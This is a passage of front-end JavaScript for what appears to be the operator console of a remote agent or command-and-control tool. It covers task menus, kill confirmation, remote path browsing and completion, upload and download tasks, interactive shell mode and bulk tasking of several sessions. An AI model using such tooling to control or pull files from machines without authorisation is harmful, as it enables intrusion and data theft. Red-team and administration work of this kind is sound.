'use strict';

function setTaskStatus(message, tone) {
  const status = $('task-status');
  status.hidden = !message;
  status.textContent = message || '';
  status.className = tone ? 'task-status ' + tone : 'task-status';
}

function focusPrimaryInput(selectContents, allowWhileBusy) {
  if (!activeAgentID || (taskRequestInFlight && !allowWhileBusy)) return;

  if (interactiveMode) {
    if (interactiveReady) {
      $('task-input').focus();
      if (selectContents) $('task-input').select();
    }
    return;
  }

  if (!TASK_TYPES[selectedTaskType].requiresPayload || $('task-input').disabled) return;
  $('task-input').focus();
  if (selectContents) $('task-input').select();
}

function shouldPersistCommandFocus() {
  return document.activeElement === $('task-input') || document.activeElement === $('send-btn');
}

function restoreCommandFocusIfNeeded(shouldRestore, selectContents) {
  if (!shouldRestore) return;
  window.requestAnimationFrame(() => {
    if (taskRequestInFlight || !activeAgentID) return;
    focusPrimaryInput(Boolean(selectContents));
  });
}

function clearKillConfirmation() {
  armedKillAgentID = null;
  if (killConfirmTimer !== null) {
    window.clearTimeout(killConfirmTimer);
    killConfirmTimer = null;
  }
}

function killConfirmationActive() {
  return Boolean(activeAgentID && armedKillAgentID === activeAgentID);
}

function armKillConfirmation() {
  clearKillConfirmation();
  armedKillAgentID = activeAgentID;
  killConfirmTimer = window.setTimeout(() => {
    clearKillConfirmation();
    if (!interactiveMode) {
      applyTaskTypeUI();
      updateTaskContextStatus();
    }
  }, KILL_CONFIRM_WINDOW_MS);
}

function updateTaskContextStatus() {
  if (taskRequestInFlight) return;
  if (selectedTaskType === 'kill' && killConfirmationActive()) {
    setTaskStatus('Confirmation armed. Click Confirm Kill within 10 seconds to queue session termination.', 'status-warn');
    return;
  }
  setTaskStatus('', '');
}

function setQueueBusy(isBusy, message) {
  taskRequestInFlight = isBusy;
  const pathBrowserWaiting = pathBrowserTaskSelected() && !activePathBrowseReady();

  taskTypeButtons.forEach(button => {
    button.disabled = isBusy || interactiveMode;
  });
  if (taskTypeSelect) taskTypeSelect.disabled = isBusy || interactiveMode;
  if (taskTypeButton) taskTypeButton.disabled = isBusy || interactiveMode;
  if (isBusy || interactiveMode) closeTaskTypeMenu();

  $('send-btn').disabled = isBusy || pathBrowserWaiting || (selectedTaskType === 'upload' && !pendingUploadFile);
  $('choose-file-btn').disabled = isBusy || !activeAgentID || pathBrowserWaiting;
  $('browse-path-btn').disabled = isBusy || !activeAgentID || pathBrowserWaiting || (selectedTaskType === 'upload' && !pendingUploadFile);
  $('cancel-task-select').disabled = isBusy;
  $('cancel-task-btn').disabled = isBusy;
  $('clear-btn').disabled = isBusy;
  $('save-output-btn').disabled = isBusy;
  updateBulkTaskButton();

  if (interactiveMode) {
    $('task-input').disabled = isBusy || !interactiveReady;
  } else {
    $('task-input').disabled = isBusy || !TASK_TYPES[selectedTaskType].requiresPayload || pathBrowserWaiting;
  }

  if (isBusy) setTaskStatus(message || 'Submitting task...', 'status-busy');
  else updateTaskContextStatus();

  renderAgentList();
}

function initTaskTypeMenu() {
  if (!taskTypeSelect || !taskTypeButton || !taskTypeList) return;

  taskTypeList.textContent = '';
  const searchWrap = document.createElement('div');
  searchWrap.className = 'task-type-search-wrap';
  taskTypeSearchInput = document.createElement('input');
  taskTypeSearchInput.type = 'search';
  taskTypeSearchInput.className = 'task-type-search';
  taskTypeSearchInput.placeholder = 'Filter actions';
  taskTypeSearchInput.setAttribute('aria-label', 'Filter task actions');
  taskTypeSearchInput.addEventListener('input', () => filterTaskTypeOptions(taskTypeSearchInput.value));
  taskTypeSearchInput.addEventListener('keydown', event => {
    if (event.key === 'ArrowDown') {
      event.preventDefault();
      firstVisibleTaskTypeOption()?.focus();
      return;
    }
    if (event.key === 'Escape') {
      event.preventDefault();
      closeTaskTypeMenu();
      taskTypeButton.focus();
    }
  });
  searchWrap.appendChild(taskTypeSearchInput);
  taskTypeList.appendChild(searchWrap);

  const optionByValue = new Map(Array.from(taskTypeSelect.options).map(option => [option.value, option]));
  TASK_GROUPS.forEach(group => {
    const groupLabel = document.createElement('div');
    groupLabel.className = 'task-type-group-label';
    groupLabel.dataset.groupLabel = group.label;
    groupLabel.textContent = group.label;
    taskTypeList.appendChild(groupLabel);

    group.types.forEach(type => {
      const option = optionByValue.get(type);
      if (!option) return;
      const item = document.createElement('button');
      item.type = 'button';
      item.className = 'task-type-option';
      item.role = 'option';
      item.dataset.value = option.value;
      item.dataset.group = group.label;
      item.dataset.searchText = [
        option.textContent,
        group.label,
        TASK_TYPES[option.value].help,
        TASK_TYPES[option.value].note,
      ].join(' ').toLowerCase();

      const title = document.createElement('span');
      title.className = 'task-type-option-title';
      title.textContent = option.textContent;
      const detail = document.createElement('span');
      detail.className = 'task-type-option-detail';
      detail.textContent = TASK_TYPES[option.value].help;
      const meta = document.createElement('span');
      meta.className = 'task-type-option-meta';
      meta.textContent = TASK_TYPES[option.value].requiresPayload ? 'Input required' : 'One click';
      item.appendChild(title);
      item.appendChild(detail);
      item.appendChild(meta);

      item.addEventListener('click', () => {
        setTaskType(option.value);
        closeTaskTypeMenu();
        taskTypeButton.focus();
      });
      taskTypeList.appendChild(item);
    });
  });

  taskTypeButton.addEventListener('click', () => {
    if (taskTypeButton.disabled) return;
    const willOpen = taskTypeList.hidden;
    setTaskTypeMenuOpen(willOpen);
    if (willOpen) window.requestAnimationFrame(() => taskTypeSearchInput?.focus());
  });
  taskTypeButton.addEventListener('keydown', event => {
    if (event.key === 'ArrowDown' || event.key === 'Enter' || event.key === ' ') {
      event.preventDefault();
      setTaskTypeMenuOpen(true);
      focusTaskTypeOption(selectedTaskType);
      return;
    }
    if (event.key === 'Escape') {
      closeTaskTypeMenu();
    }
  });
  taskTypeList.addEventListener('keydown', event => {
    const options = taskTypeOptions();
    const index = options.indexOf(document.activeElement);
    if (event.key === 'Escape') {
      event.preventDefault();
      closeTaskTypeMenu();
      taskTypeButton.focus();
      return;
    }
    if (event.key === 'ArrowDown') {
      event.preventDefault();
      (options[index + 1] || options[0])?.focus();
      return;
    }
    if (event.key === 'ArrowUp') {
      event.preventDefault();
      const previous = options[index - 1];
      if (previous) previous.focus();
      else taskTypeSearchInput?.focus();
      return;
    }
    if (event.key === 'Home') {
      event.preventDefault();
      options[0]?.focus();
      return;
    }
    if (event.key === 'End') {
      event.preventDefault();
      options[options.length - 1]?.focus();
    }
  });
  document.addEventListener('click', event => {
    if (!taskTypeMenu || taskTypeMenu.contains(event.target)) return;
    closeTaskTypeMenu();
  });
  syncTaskTypeMenu();
}

function setTaskTypeMenuOpen(isOpen) {
  if (!taskTypeButton || !taskTypeList) return;
  if (isOpen && taskTypeButton.disabled) return;
  taskTypeButton.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
  taskTypeList.hidden = !isOpen;
  if (isOpen) {
    filterTaskTypeOptions('');
  }
}

function closeTaskTypeMenu() {
  setTaskTypeMenuOpen(false);
}

function taskTypeOptions() {
  return Array.from(taskTypeList ? taskTypeList.querySelectorAll('.task-type-option:not([hidden])') : []);
}

function allTaskTypeOptions() {
  return Array.from(taskTypeList ? taskTypeList.querySelectorAll('.task-type-option') : []);
}

function firstVisibleTaskTypeOption() {
  return taskTypeOptions()[0] || null;
}

function filterTaskTypeOptions(value) {
  const query = String(value || '').trim().toLowerCase();
  if (taskTypeSearchInput && taskTypeSearchInput.value !== value) taskTypeSearchInput.value = value;

  const visibleGroups = new Set();
  allTaskTypeOptions().forEach(item => {
    const matches = !query || (item.dataset.searchText || '').includes(query);
    item.hidden = !matches;
    if (matches && item.dataset.group) visibleGroups.add(item.dataset.group);
  });

  Array.from(taskTypeList.querySelectorAll('.task-type-group-label')).forEach(label => {
    label.hidden = !visibleGroups.has(label.dataset.groupLabel);
  });
}

function focusTaskTypeOption(value) {
  const option = taskTypeOptions().find(item => item.dataset.value === value) || taskTypeOptions()[0];
  if (option) option.focus();
}

function syncTaskTypeMenu() {
  if (!taskTypeSelect || !taskTypeButtonLabel || !taskTypeButton) return;
  const option = taskTypeSelect.options[taskTypeSelect.selectedIndex];
  taskTypeButtonLabel.textContent = option ? option.textContent : selectedTaskType;
  taskTypeOptions().forEach(item => {
    const active = item.dataset.value === selectedTaskType;
    item.setAttribute('aria-selected', active ? 'true' : 'false');
  });
}

function setTaskType(type) {
  if (!TASK_TYPES[type]) return;
  saveActiveTaskDraft();
  selectedTaskType = type;
  pendingPathCompletion = null;
  queuedCompletionPath = '';
  clearPathCompletionTimer();
  hidePathSuggestions();
  taskHistoryIndex = -1;
  if (type !== 'kill') clearKillConfirmation();
  clearTaskInputError();
  applyTaskTypeUI();
  restoreActiveTaskDraft();
  if (pathSuggestionTaskSelected()) schedulePathCompletion();
  focusPrimaryInput(true);
}

function applyTaskTypeUI() {
  const config = TASK_TYPES[selectedTaskType];
  const pathTaskSelected = pathSuggestionTaskSelected();
  const pathBrowserSelected = pathBrowserTaskSelected();
  const pathBrowserWaiting = pathBrowserSelected && !activePathBrowseReady();
  const agentOnline = activeAgent && getAgentState(activeAgent) === 'online';

  taskTypeButtons.forEach(button => {
    const active = button.dataset.taskType === selectedTaskType;
    button.classList.toggle('active', active);
    button.setAttribute('aria-selected', active ? 'true' : 'false');
    button.disabled = taskRequestInFlight;
  });
  if (taskTypeSelect) {
    taskTypeSelect.value = selectedTaskType;
    taskTypeSelect.disabled = taskRequestInFlight;
  }
  if (taskTypeButton) {
    taskTypeButton.disabled = taskRequestInFlight;
    syncTaskTypeMenu();
  }

  if (interactiveMode) {
    if (taskTypeSelect) taskTypeSelect.hidden = true;
    if (taskTypeMenu) taskTypeMenu.hidden = true;
    closeTaskTypeMenu();
    document.querySelector('.command-line').hidden = false;
    hidePathSuggestions();
    updateBulkTaskButton();
    return;
  }

  if (taskTypeSelect) taskTypeSelect.hidden = false;
  if (taskTypeMenu) taskTypeMenu.hidden = false;
  document.querySelector('.command-line').hidden = !config.requiresPayload;
  $('task-help').classList.remove('error-copy');
  $('composer-note').classList.remove('error-note');
  $('task-help').textContent = config.help;
  $('composer-note').textContent = pathBrowserSelected
    ? pathBrowserComposerNote(agentOnline)
    : config.note;
  $('task-input').classList.remove('input-error');
  $('task-input').disabled = taskRequestInFlight || !config.requiresPayload || pathBrowserWaiting;
  $('task-input').placeholder = pathTaskSelected
    ? pathBrowserPlaceholder(agentOnline)
    : config.placeholder;
  $('task-input').inputMode = config.inputMode;
  $('task-input').maxLength = pathTaskSelected
    ? MAX_REMOTE_PATH
    : selectedTaskType === 'sleep'
      ? String(MAX_SLEEP_SECONDS).length
      : 48000;
  const uploadSelected = selectedTaskType === 'upload';
  const downloadSelected = selectedTaskType === 'download';
  $('send-btn').textContent = selectedTaskType === 'kill' && killConfirmationActive()
    ? 'Confirm Kill'
    : config.buttonLabel;
  $('send-btn').hidden = false;
  $('send-btn').disabled = taskRequestInFlight || pathBrowserWaiting || (uploadSelected && !pendingUploadFile);
  $('send-btn').classList.toggle('warn-button', selectedTaskType === 'interactive');
  $('send-btn').classList.toggle('danger-button', selectedTaskType === 'kill');
  $('exit-interactive-btn').hidden = true;
  $('interactive-prompt').hidden = true;

  $('choose-file-btn').hidden = !uploadSelected;
  $('choose-file-btn').disabled = taskRequestInFlight || !activeAgentID || pathBrowserWaiting;
  $('browse-path-btn').hidden = !(uploadSelected || downloadSelected);
  $('browse-path-btn').disabled = taskRequestInFlight || !activeAgentID || pathBrowserWaiting || (uploadSelected && !pendingUploadFile);
  $('browse-path-btn').title = uploadSelected && !pendingUploadFile
    ? 'Choose a local file before browsing for an upload destination'
    : downloadSelected
      ? 'Browse remote files and download directly'
      : 'Browse remote directories to choose a destination';
  updateUploadFilenameLabel();
  updateBulkTaskButton();

  if (!config.requiresPayload) {
    $('task-input').value = '';
  }
  if (!pathTaskSelected) hidePathSuggestions();
  if (pathBrowserSelected && agentOnline) ensurePathBrowserForAgent(activeAgent);

  updateTaskContextStatus();
}

function updateUploadFilenameLabel() {
  const label = $('upload-filename-label');
  if (selectedTaskType === 'upload' && pendingUploadFile) {
    label.textContent = pendingUploadFile.name + ' ->';
    label.hidden = false;
  } else {
    label.textContent = '';
    label.hidden = true;
  }
}

function setTaskInputError(message) {
  $('task-input').classList.add('input-error');
  $('task-help').classList.add('error-copy');
  $('task-help').textContent = message;
  $('task-input').focus();
}

function clearTaskInputError() {
  $('task-input').classList.remove('input-error');
  $('task-help').classList.remove('error-copy');
  if (!interactiveMode) $('task-help').textContent = TASK_TYPES[selectedTaskType].help;
}

function taskDraftKey(agentID, taskType) {
  return agentID + ':' + taskType;
}

function saveActiveTaskDraft() {
  if (!activeAgentID || interactiveMode) return;
  const config = TASK_TYPES[selectedTaskType];
  if (!config || !config.requiresPayload) return;

  const key = taskDraftKey(activeAgentID, selectedTaskType);
  const value = $('task-input').value;
  if (value) taskDrafts.set(key, value);
  else taskDrafts.delete(key);
}

function restoreActiveTaskDraft() {
  if (!activeAgentID || interactiveMode) return;
  const config = TASK_TYPES[selectedTaskType];
  if (!config || !config.requiresPayload) return;

  const key = taskDraftKey(activeAgentID, selectedTaskType);
  $('task-input').value = taskDrafts.get(key) || '';
  clearTaskInputError();
  if (pathSuggestionTaskSelected()) schedulePathCompletion();
}

function clearActiveTaskDraft(taskType) {
  if (!activeAgentID) return;
  taskDrafts.delete(taskDraftKey(activeAgentID, taskType));
}

function pathBrowserComposerNote(agentOnline) {
  if (!agentOnline) return 'Path browser starts automatically once the selected session is online.';
  if (!activePathBrowseReady()) {
    return 'Preparing the remote path browser. Input unlocks when the session confirms fast browsing.';
  }
  return TASK_TYPES[selectedTaskType].note;
}

function pathBrowserPlaceholder(agentOnline) {
  if (!agentOnline) return 'Waiting for online session...';
  if (!activePathBrowseReady()) return 'Preparing remote path browser...';
  return TASK_TYPES[selectedTaskType].placeholder;
}

function pathSuggestionTaskSelected() {
  return selectedTaskType === 'download' || selectedTaskType === 'upload';
}

function pathBrowserTaskSelected() {
  return selectedTaskType === 'download' || selectedTaskType === 'upload';
}

function schedulePathCompletion() {
  clearPathCompletionTimer();

  const path = $('task-input').value.trim();
  if (!activePathBrowseReady() || !path || !activeAgentID || taskRequestInFlight || !pathSuggestionTaskSelected() || hasInvalidPathChars(path)) {
    hidePathSuggestions();
    return;
  }

  queuedCompletionPath = path;
  pathCompletionTimer = window.setTimeout(() => {
    pathCompletionTimer = null;
    requestPathCompletion(path);
  }, PATH_COMPLETION_DEBOUNCE_MS);
}

function clearPathCompletionTimer() {
  if (pathCompletionTimer === null) return;
  window.clearTimeout(pathCompletionTimer);
  pathCompletionTimer = null;
}

function warmOnlinePathBrowsers(agents) {
  const liveIDs = new Set();

  for (const agent of agents) {
    if (!agent || !agent.id) continue;
    liveIDs.add(agent.id);

    if (getAgentState(agent) === 'online') {
      ensurePathBrowserForAgent(agent);
    } else {
      markPathBrowserOffline(agent.id);
    }
  }

  for (const agentID of Array.from(pathBrowseStates.keys())) {
    if (!liveIDs.has(agentID)) resetPathBrowserState(agentID, false);
  }
}

function getPathBrowseState(agentID, create) {
  if (!agentID) return null;
  let state = pathBrowseStates.get(agentID);
  if (!state && create) {
    state = {
      ready: false,
      readyAt: 0,
      startTaskID: '',
      renewTimer: null,
    };
    pathBrowseStates.set(agentID, state);
  }
  return state || null;
}

function activePathBrowseReady() {
  if (!activeAgentID || !activeAgent || getAgentState(activeAgent) !== 'online') return false;
  const state = getPathBrowseState(activeAgentID, false);
  return pathBrowseStateReady(state);
}

function pathBrowseStateReady(state) {
  return Boolean(state && state.ready && Date.now() - state.readyAt < PATH_BROWSE_FAST_WINDOW_MS);
}

function ensurePathBrowserForAgent(agent) {
  if (!token || !agent || !agent.id || interactiveMode) return;
  if (getAgentState(agent) !== 'online') {
    markPathBrowserOffline(agent.id);
    return;
  }

  const state = getPathBrowseState(agent.id, true);
  if (pathBrowseStateReady(state) || state.startTaskID) return;
  state.ready = false;

  queuePathBrowseStart(agent.id, false);
}

async function queuePathBrowseStart(agentID, isRenewal) {
  const state = getPathBrowseState(agentID, true);
  if (!token || !agentID || state.startTaskID) return;

  const agent = allAgents.find(item => item.id === agentID) || (agentID === activeAgentID ? activeAgent : null);
  if (!agent || getAgentState(agent) !== 'online') {
    markPathBrowserOffline(agentID);
    return;
  }

  if (!isRenewal) state.ready = false;
  state.startTaskID = PENDING_TASK_ID;
  applyPathBrowserUI(agentID);

  try {
    const data = await submitTask(agentID, { type: 'pathbrowse', payload: 'start' });
    if (!data) {
      state.ready = false;
      state.startTaskID = '';
      applyPathBrowserUI(agentID);
      return;
    }

    state.startTaskID = data.task_id;
    if (isRenewal) {
      state.ready = true;
      state.readyAt = Date.now();
      state.startTaskID = '';
      schedulePathBrowseRenewal(agentID);
      applyPathBrowserUI(agentID);
      return;
    }

    const deferred = deferredPathBrowseOutputs.get(data.task_id);
    if (deferred) {
      deferredPathBrowseOutputs.delete(data.task_id);
      handlePathBrowseOutput(deferred);
    }
  } catch (err) {
    state.ready = false;
    state.startTaskID = '';
    if (agentID === activeAgentID) {
      renderPathSuggestions('', [], 'Path browser failed to start: ' + err.message);
    }
    applyPathBrowserUI(agentID);
  }
}

function handlePathBrowseOutput(output) {
  const state = getPathBrowseState(activeAgentID, false);
  if (!state || !state.startTaskID) return;

  if (state.startTaskID === PENDING_TASK_ID) {
    deferredPathBrowseOutputs.set(output.task_id, output);
    return;
  }
  if (output.task_id !== state.startTaskID) return;

  state.startTaskID = '';

  if (output.error) {
    state.ready = false;
    renderPathSuggestions('', [], output.error);
    applyPathBrowserUI(activeAgentID);
    return;
  }

  state.ready = Boolean(output.output && output.output.includes('ready'));
  if (state.ready) {
    const outputTime = output.timestamp ? new Date(output.timestamp).getTime() : NaN;
    state.readyAt = Number.isFinite(outputTime) ? outputTime : Date.now();
    if (!pathBrowseStateReady(state)) {
      state.ready = false;
      queuePathBrowseStart(activeAgentID, false);
      applyPathBrowserUI(activeAgentID);
      return;
    }
    schedulePathBrowseRenewal(activeAgentID);
    if (pathSuggestionTaskSelected() && $('task-input').value.trim()) schedulePathCompletion();
  }
  applyPathBrowserUI(activeAgentID);
}

function schedulePathBrowseRenewal(agentID) {
  const state = getPathBrowseState(agentID, false);
  if (!state) return;
  clearPathBrowseRenewal(agentID);
  state.renewTimer = window.setTimeout(() => {
    state.renewTimer = null;
    const agent = allAgents.find(item => item.id === agentID);
    if (state.ready && agent && getAgentState(agent) === 'online') {
      queuePathBrowseStart(agentID, true);
    }
  }, PATH_BROWSE_RENEW_MS);
}

function clearPathBrowseRenewal(agentID) {
  const state = getPathBrowseState(agentID, false);
  if (!state || state.renewTimer === null) return;
  window.clearTimeout(state.renewTimer);
  state.renewTimer = null;
}

function markPathBrowserOffline(agentID) {
  const state = getPathBrowseState(agentID, false);
  if (!state) return;
  clearPathBrowseRenewal(agentID);
  state.ready = false;
  state.readyAt = 0;
  state.startTaskID = '';
  if (agentID === activeAgentID) applyPathBrowserUI(agentID);
}

function resetPathBrowserState(agentID, sendStop) {
  const state = getPathBrowseState(agentID, false);
  if (state) clearPathBrowseRenewal(agentID);
  pathBrowseStates.delete(agentID);

  if (sendStop && agentID && token) {
    apiFetch('/api/agents/' + agentID + '/task', {
      method: 'POST',
      body: JSON.stringify({ type: 'pathbrowse', payload: 'stop' }),
    }).catch(() => {});
  }
}

function resetAllPathBrowserStates(sendStop) {
  for (const agentID of Array.from(pathBrowseStates.keys())) {
    resetPathBrowserState(agentID, sendStop);
  }
}

function resetActivePathCompletion() {
  pendingPathCompletion = null;
  queuedCompletionPath = '';
  deferredPathCompletionOutputs = new Map();
  clearPathCompletionTimer();
  hidePathSuggestions();
}

function applyPathBrowserUI(agentID) {
  if (agentID === activeAgentID && pathBrowserTaskSelected() && !interactiveMode) applyTaskTypeUI();
}

async function requestPathCompletion(path) {
  if (!activePathBrowseReady() || !activeAgentID || taskRequestInFlight || !pathSuggestionTaskSelected()) return;
  if (!path || hasInvalidPathChars(path)) return;

  if (pendingPathCompletion) {
    queuedCompletionPath = path;
    return;
  }

  const targetAgentID = activeAgentID;
  pendingPathCompletion = {
    agentID: targetAgentID,
    taskID: PENDING_TASK_ID,
    input: path,
  };
  showPathSuggestionsLoading(path);

  try {
    const data = await submitTask(targetAgentID, { type: 'complete', payload: path });
    if (!data) {
      pendingPathCompletion = null;
      hidePathSuggestions();
      return;
    }
    if (!pendingPathCompletion || targetAgentID !== activeAgentID) return;
    pendingPathCompletion.taskID = data.task_id;
    const deferred = deferredPathCompletionOutputs.get(data.task_id);
    if (deferred) {
      deferredPathCompletionOutputs.delete(data.task_id);
      handlePathCompletionOutput(deferred);
    }
  } catch (err) {
    pendingPathCompletion = null;
    renderPathSuggestions(path, [], 'Path completion failed: ' + err.message);
  }
}

function handlePathCompletionOutput(output) {
  if (!pendingPathCompletion) return;
  if (pendingPathCompletion.taskID === PENDING_TASK_ID) {
    deferredPathCompletionOutputs.set(output.task_id, output);
    return;
  }
  if (output.task_id !== pendingPathCompletion.taskID) return;

  const pending = pendingPathCompletion;
  pendingPathCompletion = null;

  if (pending.agentID !== activeAgentID) return;

  const currentPath = $('task-input').value.trim();
  const nextPath = queuedCompletionPath;
  queuedCompletionPath = '';

  if (nextPath && nextPath !== pending.input && nextPath === currentPath) {
    requestPathCompletion(nextPath);
  }

  if (currentPath !== pending.input) return;

  if (output.error) {
    renderPathSuggestions(pending.input, [], output.error);
    return;
  }

  let result;
  try {
    result = JSON.parse(output.output || '{}');
  } catch (_) {
    renderPathSuggestions(pending.input, [], 'Path completion returned an invalid response.');
    return;
  }

  const items = Array.isArray(result.items) ? result.items : [];
  renderPathSuggestions(pending.input, items, '');
}

function showPathSuggestionsLoading(path) {
  const panel = $('path-suggestions');
  panel.textContent = '';
  panel.hidden = false;

  const note = document.createElement('div');
  note.className = 'path-suggestion-note';
  note.textContent = 'Searching ' + path + '...';
  panel.appendChild(note);
}

function renderPathSuggestions(input, items, message) {
  const panel = $('path-suggestions');
  panel.textContent = '';
  panel.hidden = false;

  const header = document.createElement('div');
  header.className = 'path-suggestion-header';
  header.textContent = message || ('Suggestions for ' + input);
  panel.appendChild(header);

  const parentPath = parentDirectoryPath(input);
  if (parentPath) {
    const parentButton = document.createElement('button');
    parentButton.type = 'button';
    parentButton.className = 'path-suggestion-item path-suggestion-parent';
    parentButton.textContent = '...  ' + parentPath;
    parentButton.title = 'Go up to ' + parentPath;
    parentButton.addEventListener('click', () => {
      $('task-input').value = parentPath;
      clearTaskInputError();
      saveActiveTaskDraft();
      focusPrimaryInput(false, true);
      requestPathCompletion(parentPath);
    });
    panel.appendChild(parentButton);
  }

  if (!items.length) {
    const empty = document.createElement('div');
    empty.className = 'path-suggestion-note';
    empty.textContent = message ? '' : 'No matching remote paths.';
    if (empty.textContent) panel.appendChild(empty);
    return;
  }

  for (const item of items) {
    const button = document.createElement('button');
    button.type = 'button';
    button.className = 'path-suggestion-item';
    button.textContent = item;
    button.title = 'Use ' + item;
    button.addEventListener('click', () => {
      $('task-input').value = item;
      clearTaskInputError();
      saveActiveTaskDraft();
      focusPrimaryInput(false, true);
      if (isDirectorySuggestion(item)) {
        requestPathCompletion(item);
      } else {
        hidePathSuggestions();
      }
    });
    panel.appendChild(button);
  }
}

function isDirectorySuggestion(path) {
  return path.endsWith('/') || path.endsWith('\\');
}

function parentDirectoryPath(path) {
  if (!isDirectorySuggestion(path)) return '';
  const separator = path.endsWith('\\') ? '\\' : '/';
  const trimmed = path.slice(0, -1);
  if (!trimmed) return '';

  const idx = Math.max(trimmed.lastIndexOf('/'), trimmed.lastIndexOf('\\'));
  if (idx < 0) return '';
  if (idx === 0 && separator === '/') return '/';

  return trimmed.slice(0, idx + 1);
}

function hidePathSuggestions() {
  const panel = $('path-suggestions');
  if (!panel) return;
  panel.hidden = true;
  panel.textContent = '';
}

function navigateTaskHistory(direction) {
  if (!taskHistory.length) return;

  if (direction < 0) {
    taskHistoryIndex = taskHistoryIndex === -1 ? taskHistory.length - 1 : Math.max(0, taskHistoryIndex - 1);
  } else {
    if (taskHistoryIndex === -1) return;
    taskHistoryIndex++;
    if (taskHistoryIndex >= taskHistory.length) {
      taskHistoryIndex = -1;
      $('task-input').value = '';
      clearTaskInputError();
      saveActiveTaskDraft();
      return;
    }
  }

  const entry = taskHistory[taskHistoryIndex];
  setTaskType(entry.type);
  $('task-input').value = entry.payload;
  saveActiveTaskDraft();
}

function navigateInteractiveHistory(direction) {
  if (!interactiveHistory.length) return;

  if (direction < 0) {
    interactiveHistoryIndex = interactiveHistoryIndex === -1 ? interactiveHistory.length - 1 : Math.max(0, interactiveHistoryIndex - 1);
  } else {
    if (interactiveHistoryIndex === -1) return;
    interactiveHistoryIndex++;
    if (interactiveHistoryIndex >= interactiveHistory.length) {
      interactiveHistoryIndex = -1;
      $('task-input').value = '';
      return;
    }
  }

  $('task-input').value = interactiveHistory[interactiveHistoryIndex];
}

async function clearOutputHistory(agentID) {
  if (!agentID || taskRequestInFlight) return;

  $('clear-btn').disabled = true;
  $('save-output-btn').disabled = true;
  outputsRequestID++;

  try {
    const resp = await apiFetch('/api/agents/' + agentID + '/tasks', {
      method: 'DELETE',
    });
    if (!resp.ok) {
      const message = await readResponseMessage(resp, 'clear output failed (' + resp.status + ')');
      appendOutput('[-] ' + message, '', agentID);
      return;
    }
    if (agentID !== activeAgentID) return;
    stopSSEStream();
    $('output').textContent = '';
    currentOutputs = [];
    seenTaskIDs = new Set();
    followOutput = true;
    hasHydratedOutputs = true;
    startSSEStream(agentID, interactiveMode);
    renderSessionPanels();
    updateOutputControls();
    updateOutputEmptyState();
  } catch (err) {
    appendOutput('[-] clear output error: ' + err.message, '', agentID);
  } finally {
    if (agentID === activeAgentID && !taskRequestInFlight) {
      $('clear-btn').disabled = false;
      $('save-output-btn').disabled = false;
    }
  }
}

async function sendTask() {
  if (!activeAgentID || taskRequestInFlight) return;

  if (interactiveMode) {
    await sendInteractiveCommand();
    return;
  }

  if (selectedTaskType === 'upload') {
    if (!pendingUploadFile) {
      setTaskInputError('Choose a file with Choose File before queueing the upload.');
      return;
    }
    await queueUploadTask();
    return;
  }

  const task = buildTaskFromComposer();
  if (!task) return;

  if (task.type === 'interactive') {
    await queueInteractiveStart();
    return;
  }

  if (task.type === 'kill' && !killConfirmationActive()) {
    armKillConfirmation();
    applyTaskTypeUI();
    updateTaskContextStatus();
    return;
  }

  clearKillConfirmation();
  hidePathSuggestions();

  const targetAgentID = activeAgentID;
  const restoreFocus = shouldPersistCommandFocus() && TASK_TYPES[selectedTaskType].requiresPayload;
  setQueueBusy(true, 'Submitting ' + task.type + ' task...');

  try {
    const data = await submitTask(targetAgentID, task);
    if (!data) return;
    recordTaskHistory(task.type, task.payload);
    if (task.type === 'download') {
      downloadTasks.set(data.task_id, {
        path: task.payload,
        filename: basenameFromPath(task.payload),
        status: 'progress',
        artifactKey: '',
      });
    }
    $('task-input').value = '';
    clearActiveTaskDraft(task.type);
    clearTaskInputError();
    appendOutput('[>] ' + task.type + formatTaskPayloadEcho(task) + '  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
    refreshActiveAgent();
  } catch (err) {
    appendOutput('[-] network error: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
    restoreCommandFocusIfNeeded(restoreFocus, false);
  }
}

async function sendBulkTask() {
  const targets = selectedAgents();
  if (!targets.length || taskRequestInFlight || interactiveMode) return;
  if (!BULK_TASK_TYPES.has(selectedTaskType)) {
    setTaskStatus('This action must be queued one session at a time.', 'status-warn');
    updateBulkTaskButton();
    return;
  }

  const task = buildTaskFromComposer();
  if (!task) return;

  clearKillConfirmation();
  hidePathSuggestions();
  const restoreFocus = shouldPersistCommandFocus() && TASK_TYPES[selectedTaskType].requiresPayload;
  setQueueBusy(true, 'Queueing ' + task.type + ' for ' + targets.length + ' sessions...');

  let queued = 0;
  let failed = 0;
  const queuedIDs = [];
  try {
    for (const agent of targets) {
      const data = await submitTask(agent.id, task);
      if (data) {
        queued++;
        queuedIDs.push(agent.hostname || agent.id.slice(0, 8));
      } else {
        failed++;
      }
    }
    if (queued > 0) {
      recordTaskHistory(task.type, task.payload);
      $('task-input').value = '';
      clearActiveTaskDraft(task.type);
      clearTaskInputError();
      appendOutput('[>] bulk ' + task.type + ' queued for ' + queued + ' session' + (queued === 1 ? '' : 's') + ': ' + queuedIDs.join(', '), '', activeAgentID, 'operator');
    }
    if (failed > 0) {
      appendOutput('[-] bulk ' + task.type + ' failed for ' + failed + ' session' + (failed === 1 ? '' : 's'), '', activeAgentID, 'error');
    }
    refreshActiveAgent();
  } catch (err) {
    appendOutput('[-] bulk queue error: ' + err.message, '', activeAgentID, 'error');
  } finally {
    setQueueBusy(false, '');
    restoreCommandFocusIfNeeded(restoreFocus, false);
  }
}

async function submitTask(agentID, task) {
  const resp = await apiFetch('/api/agents/' + agentID + '/task', {
    method: 'POST',
    body: JSON.stringify(task),
  });

  if (!resp.ok) {
    const message = await readResponseMessage(resp, 'request failed (' + resp.status + ')');
    appendOutput('[-] ' + message, '', agentID);
    return null;
  }

  return resp.json();
}

async function deleteQueuedTask(taskID) {
  if (!activeAgentID || !taskID) return;
  try {
    const resp = await apiFetch('/api/agents/' + activeAgentID + '/tasks/' + encodeURIComponent(taskID), {
      method: 'DELETE',
    });
    if (!resp.ok) {
      appendOutput('[-] remove queued task failed (' + resp.status + ')');
      return;
    }
    appendOutput('[>] removed queued task ' + taskID.slice(0, 8));
    await refreshActiveAgent();
  } catch (err) {
    appendOutput('[-] remove queued task error: ' + err.message);
  }
}

async function queueCancelTask(taskID) {
  if (!activeAgentID || !taskID || taskRequestInFlight) return;
  const targetAgentID = activeAgentID;
  setQueueBusy(true, 'Queueing cancellation request...');
  try {
    const data = await submitTask(targetAgentID, { type: 'cancel', payload: taskID });
    if (data) {
